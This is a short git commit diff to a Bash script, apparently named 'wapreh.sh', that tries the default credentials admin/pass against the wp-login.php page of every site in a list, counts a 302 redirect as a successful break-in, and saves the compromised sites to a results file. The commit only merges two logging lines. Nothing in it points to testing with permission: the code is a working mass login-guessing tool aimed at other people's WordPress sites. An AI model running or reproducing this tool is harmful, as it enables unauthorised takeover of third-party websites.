b889d1326626022e52494f56dc5c0f422daf4f2d
Jevil36239 <51107256+Jevil36239@users.noreply.github.com>
2021-10-24 20:36:33 +0700

    Update wapreh.sh

--- wapreh.sh
+++ wapreh.sh
@@ -21,8 +21,7 @@ read -p "Threads ( Default 10 ) : " thread;
  ngecurl=$(curl --connect-timeout 10 --max-time 10 -s -w "\nHTTP_STATUS_CODE_X %{http_code}\n" "${site}/wp-login.php" --data "log=admin&pwd=pass&wp-submit=Log+In" --compressed)
  status=$(echo ${ngecurl} | grep 'HTTP_STATUS_CODE_X' | awk '{print $2}')
  if [[ $status =~ "302" ]]; then
-  echo -e "-$2/$cekbaris- (-Y-) $site/wp-login.php#[ admin / pass ]\n"
-  echo $site/wp-login.php#[admin | pass] | tee -a resultwordpres.txt
+  echo -e "-$2/$cekbaris- (-Y-) $site/wp-login.php#[ admin / pass ]\n" | tee -a resultwordpres.txt
  elif [[ ! -z $(echo ${ngecurl} | grep login_error | grep div) ]];
   then
     echo -ne "-$2/$cekbaris- (-T-) $site\n"
